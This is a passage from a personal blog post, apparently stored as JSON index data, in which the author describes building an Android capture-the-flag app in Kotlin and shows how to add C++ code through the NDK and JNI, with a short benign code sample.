really read everything, you will probably think that why I did not explain the if-else statement in the button. Thats because it\u0026rsquo;s for PART 3. If you looks closely, you will think that what\u0026rsquo;s wee().eee(wee().ed(a)). Basically, wee() is a class which is stated in another file. Kotlin have this feature where you could just declare the class in any file and still use it on other files without the need of importing it. here\u0026rsquo;s the following code for wee() class.\n1 2 3 4 5 6 7 8 9 class wee { init { System.loadLibrary(\u0026#34;shroomish_flag_checker\u0026#34;) System.loadLibrary(\u0026#34;whatsfun\u0026#34;) } external fun eee(input: String): Boolean external fun ed(input: String): String } This is just a simple class that load\u0026rsquo;s 2 libraries and make the functions available to public. So what libraries are those ? it\u0026rsquo;s actually my own custom library that requires C++.\nPART 4 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain briefly on how you could write C++ and use it in Android APK. To make this work, you will need to go to Tools \u0026gt; SDK Manager \u0026gt; Languages \u0026amp; Frameworks \u0026gt; Android SDK \u0026gt; SDK Tools \u0026gt; **tick** NDK and CMake and press OK to install the needed tools.\nAfter the tools are installed, right click on the app and click Add C++ into Module and just click ok with the default option.\nAfter that, you should get your own C++ files that has alot of comments in it. Just remove it and replace with this.\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; extern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_shroomish_1flag_1checker_wee_ed(JNIEnv* env, jobject /* this */, jstring input) { const char* inputCStr = env-\u0026gt;GetStringUTFChars(input, nullptr); std::string g = std::string(inputCStr); env-\u0026gt;ReleaseStringUTFChars(input, inputCStr); return env-\u0026gt;NewStringUTF(g.c_str()); } The important part of this code is the Java_com_example_shroomish_1flag_1checker_wee_ed. You will need to change it to Java_com_example_\u0026lt;yourproject\u0026gt;_\u0026lt;filename\u0026gt;_\u0026lt;functionname\u0026gt;. Aside from that, most of it are kind of important but you dont really need to know expect that the g is where your input will goes and return will return your strings.\nthis C++ code only returns strings. If you want to return another data type, EXPLORE YOURSELF\nFINAL PART I actually did not explain my own code nor published it in this blog. If you really want to look into my C++ code, you could just go to my github and I have upload the whole project there. While I did not mention chatgpt, it actually helps a lot cause C++ is another nightmare. For those that want to try my challenge, I have uploaded the APK as well.\nReferences My Android Project My Android APK Useful YT video for developing the UI Android Documentation on adding C++ code ","permalink":"https://callmeks.github.io/posts/journey-of-creating-android-ctf/","summary":"\u003ch2 id=\"overview-about-the-journey\"\u003eOverview about the journey\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"part-0\"\u003ePART 0\u003c/h2\u003e\n\u003cp\u003eHere\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\u003c/p\u003e","title":"Journey of Creating Android CTF"}]